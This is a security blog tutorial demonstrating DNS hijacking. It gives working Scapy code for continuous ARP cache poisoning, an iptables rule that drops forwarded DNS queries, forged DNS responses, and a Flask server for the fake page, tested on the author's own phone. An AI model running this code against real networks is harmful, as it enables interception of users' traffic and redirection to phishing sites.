---
title: "Performing DNS Hijacking to Redirect Users to a Fake Website"
date: 2019-08-22
toc: true
toc_label: "Table of Contents"
categories:
  - blog
tags:
  - Network Security
  - DNS Hijacking
  - ARP Spoofing
  - Scapy
---

# Introduction
In my previous [post][arp], we had a look at poisoning ARP caches which, allowed us to intercept the target's traffic. In this post, we build on that to intercept all DNS requests of the
target and provide a spoofed reply pointing to a web server running on our machine.

# DNS
Every time a user types in an URL into the browser or any web client, the client resolves or "translates" the URL into an IP address. It does this to identify where to send the corresponding HTTP request. The following steps take place to translate the URL into an IP address:

1. The browser first queries the OS with the request asking if it knows the IP address,
2. the OS checks it's local cache and the HOSTS file which contains mappings between URLs and IP address,
3. if the OS does not find any mappings, it queries the local DNS resolver which is usually provided by your ISP,
4. the DNS resolver also checks if it has an answer. If it doesn't, it will recursivelly query
the nameservers till it receives a response from the nameserver responsible for the domain.  

Once the IP address is retrieved, the client sends the HTTP request and displays the page returned.

# DNS Spoofing
Before we can send spoofed responses to the target, we need the target's traffic to pass through our system. This is done by poisoning both the router's and target's ARP cache. The following code shows how this can be done.

```python
while True:
  # Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
  send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac), verbose=0)

  # Poison target's cache
  send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac), verbose=0)

  # Sleep to prevent flooding
  time.sleep(2)
```

By continuously sending spoofed ARP responses, we poison the ARP caches. Now we control the traffic, i.e., we can decide on what to forward and what not to. By stopping all DNS queries from the target, we can then send a spoofed DNS response pointing to our system. This will cause the target to send all future HTTP/HTTPS requests to our machine. 

To stop forwarding all DNS messages, we need to drop them by adding a firewall rule. This is carried out in the following manner.

```python
# Check to see if we are on linux
if (platform.system() == "Linux"):
  # Enable IP forwarding
  ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
  ipf_read = ipf.read()
  if (ipf_read != '1\n'):
    ipf.write('1\n')
  ipf.close()

  # Disable DNS Query forwarding
  firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
  Popen([firewall], shell=True, stdout=PIPE)
```

Now, since all DNS messages from the target are dropped, we need to provide the target with a spoofed DNS response. Failing to do so can lead to a DOS since the target will not be able to resolve the URL to any IP address. To send a spoofed DNS answer, we can use the following code.

```python
if (pkt[IP].src == g_target_ip and
    pkt.haslayer(DNS) and
    pkt[DNS].qr == 0 and        # DNS Query
    pkt[DNS].opcode == 0 and    # DNS Standard Query
    pkt[DNS].ancount == 0       # Answer Count
    ):

  print("Sending spoofed DNS response")

  if (pkt.haslayer(IPv6)):
    ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
  else:
    ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)

  # Create the spoofed DNS response (returning our IP as the answer instead of the endpoint)
  dns_resp =  ip_layer/ \
        UDP(
          dport=pkt[UDP].sport,
          sport=53
          )/ \
        DNS(
          id=pkt[DNS].id,       # Same as query
          ancount=1,            # Number of answers
          qr=1,                 # DNS Response
          ra=1,                 # Recursion available
          qd=(pkt.getlayer(DNS)).qd,  # Query Data
          an=DNSRR(
            rrname=pkt[DNSQR].qname,  # Queried host name
            rdata=g_server_ip,        # IP address of queried host name
            ttl = 10
            )
          )

  # Send the spoofed DNS response
  print(dns_resp.show())
  send(dns_resp, verbose=0)
  print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {g_server_ip}")
```

In the above code, *pkt* holds the DNS request intercepted by our machine. Using it, we send a DNS response saying that the URL maps to our IP address. Now since the target will start sending HTTP/HTTPS request to our machine, we need to respond to those with our webpage. A simple demonstration can be done using Flask in the following manner.

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def spoofed_page():
    return '<h1 align="center">You have been pwned!</h1>'

@app.route('/<path:dummy>')
def spoofed_dir(dummy):
  return '<h1 align="center">You have been pwned!</h1>'

if __name__ == '__main__':
  app.run(host='192.168.137.1', ssl_context='adhoc', port=443)
```
The host argument must be set to the IP address on which the webserver is being run on. Now any page accessed by the target will result in the above html being returned.

# Results
I am running the DNS-hijacker and the web server on a Raspberry PI 3B+ with the target as my iPhone.

![dns-hijacker](../../assets/videos/dns-hijacker.gif)

Sending a request from my iPhone once the DNS hijacker and the web server are started,  results in the following.

![pwned](../../assets/videos/pwned.gif)

We can see that a GET request to `xda-developers.com` was successfully redirected to our webpage. yaaa. Note that the warning can be removed by supplying phony certificates (hard!), but that topic is for another post.

The full script is available on my github [page][page].

[page]: https://github.com/venkat-abhi/dns-redirector
[arp]: https://fsec404.github.io/blog/arp-cache-poisoning-and-mitm/